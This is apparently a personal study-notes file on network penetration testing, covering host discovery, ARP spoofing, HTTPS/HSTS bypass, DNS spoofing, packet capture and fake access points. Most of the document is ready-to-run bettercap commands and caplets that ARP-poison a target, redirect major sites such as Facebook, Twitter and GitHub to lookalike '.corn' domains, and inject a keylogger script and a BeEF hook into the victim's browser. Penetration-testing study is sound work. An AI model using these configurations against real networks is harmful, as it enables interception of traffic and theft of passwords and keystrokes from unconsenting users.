# Network Penetration Testing

### Section 1: Information Gathering - Hosts

- `netdiscoverer -r ROUTER_IP/SUBNET` (replace ROUTER_IP value with inet value obtained from `ifconfig`)

### Section 2: Information Gathering - Services

- nmap/zenmap

### Section 3: MITM Attacks - ARP Spoofing

- ARP Poisoning using `arpspoof`

    ```
    arpspoof -i <NETWORK_INTERFACE> -t <IP_OF_NETWORK_INTERFACE> <TARGET_IP>
    arpspoof -i <NETWORK_INTERFACE> -t <TARGET_IP> <IP_OF_NETWORK_INTERFACE>
    ```

- Enable portforwarding to bypass linux security feature (when linux receives requests, linux stops it)

    `echo 1 > /proc/sys/net/ipv4/ip_forward`

- ARP Poisoning using `bettercap`

    Set up:

    ```
    bettercap -iface <NETWORK_INTERFACE>
    bettercap -iface <NETWORK_INTERFACE> -caplet <CAPLET_FILE>.cap
    ```

    Settings:

    ```
    arp.spoof > running
    events.stream > running
    net.probe > running
    net.recon > running
    net.sniff > running
    ```

    spoof.cap:

    ```
    net.probe on
    set arp.spoof.fullduplex true
    set arp.spoof.targets TARGET_IP
    arp.spoof on
    net.sniff on
    ```

### Section 4: MITM Attacks - Bypassing HTTPS

- HSTS Disabled

    spoof.cap:

    ```
    net.probe on
    set arp.spoof.fullduplex true
    set arp.spoof.targets TARGET_IP
    arp.spoof on
    net.sniff on
    set net.sniff.local true
    net.sniff on

    caplets.show
    hstshijack/hstshijack
    ```

- HSTS Enabled

    spoof.cap

    ```
    net.probe on
    set arp.spoof.fullduplex true
    set arp.spoof.targets TARGET_IP
    arp.spoof on
    net.sniff on
    set net.sniff.local true
    net.sniff on

    set hstshijack.log             /usr/local/share/bettercap/caplets/hstshijack/ssl.log
    set hstshijack.ignore          *
    set hstshijack.targets         twitter.com,*.twitter.com,facebook.com,*.facebook.com,apple.com,*.apple.com,ebay.com,*.ebay.com,*.linkedin.com,linkedin.com,*.winzip.com,winzip.com,*.google.ie,google.ie,*.stackoverflow.com,stackoverflow.com,*.avg.com,avg.com,*.instagram.com,instagram.com,*.tiktok.com,tiktok.com,*.bbc.com,bbc.com,*.cnn.com,cnn.com,*.microsoft.com,microsoft.com,*.reddit.com,reddit.com,*.amazon.com,amazon.com,*.github.com,github.com,*.gitlab.com,gitlab.com
    set hstshijack.replacements    twitter.corn,*.twitter.corn,facebook.corn,*.facebook.corn,apple.corn,*.apple.corn,ebay.corn,*.ebay.corn,*.linkedin.com,linkedin.com,*.winzip.com,winzip.com,*.google.ie,google.ie,*.stackoverflow.com,stackoverflow.com,*.avg.com,avg.com,*.instagram.corn,instagram.corn,*.tiktok.com,tiktok.com,*.bbc.com,bbc.com,*.cnn.com,cnn.com,*.microsoft.com,microsoft.com,*.reddit.com,reddit.com,*.amazon.com,amazon.com,*.github.corn,github.corn,*.gitlab.com,gitlab.com
    set hstshijack.obfuscate       false
    set hstshijack.encode          false
    set hstshijack.payloads        *:/usr/local/share/bettercap/caplets/hstshijack/payloads/keylogger.js,*:/root/Desktop/inject_beef.js 
    set http.proxy.script  /usr/local/share/bettercap/caplets/hstshijack/hstshijack.js
    set dns.spoof.domains  twitter.corn,*.twitter.corn,facebook.corn,*.facebook.corn,apple.corn,*.apple.corn,ebay.corn,*.ebay.corn,*.linkedin.com,linkedin.com,*.winzip.com,winzip.com,*.google.ie,google.ie,*.stackoverflow.com,stackoverflow.com,*.avg.com,avg.com,*.instagram.corn,instagram.corn,*.tiktok.com,tiktok.com,*.bbc.com,bbc.com,*.cnn.com,cnn.com,*.microsoft.com,microsoft.com,*.reddit.com,reddit.com,*.amazon.com,amazon.com,*.github.corn,github.corn,*.gitlab.com,gitlab.com
    http.proxy  on
    dns.spoof   on

    caplets.show
    hstshijack/hstshijack
    ```

- Summary of attack's effectiveness on modern browsers 

    |Protocol|Hacker Setup|Firefox|Chrome|
    |--------|------------|-------|------|
    |HTTP|Bettercap|:white_check_mark:|:white_check_mark:|
    |HTTPS|Bettercap + hstsjihack|:white_check_mark:|Include in hstshijack caplet|
    |HTTPS + HSTS|Bettercap + hstsjihack|:white_check_mark:|Secure DNS disabled|

### Section 5: MITM Attacks - DNS Spoofing

- ARP Spoofing vs DNS Spoofing

- Use bettercap module

    spoof.cap
    
    ```
    set dns.spoof.all true
    set dns.spoof.domains DOMAIN_1,DOMAIN_2
    dns.spoof on
    ```

### Section 6: MITM Attacks - Analyse captured packets via WireShark

- Sniffing and analysing data

- Filtering, tracing and inspecting data

- Capturing passwords & credentials

### Section 7: MITM Attacks - Fake Access Point (Honeypot)

- You will need a wireless adapter with AP mode enabled

- Set up access point in Kali via [Wifi Hotspot](https://github.com/lakinduakash/linux-wifi-hotspot) or [hostapd](https://www.section.io/engineering-education/setting-up-hotspot-on-kali-linux/)

- Apparently, [Honeypots](https://www.techtarget.com/searchsecurity/definition/honey-pot) can be used AGAINST malicious actors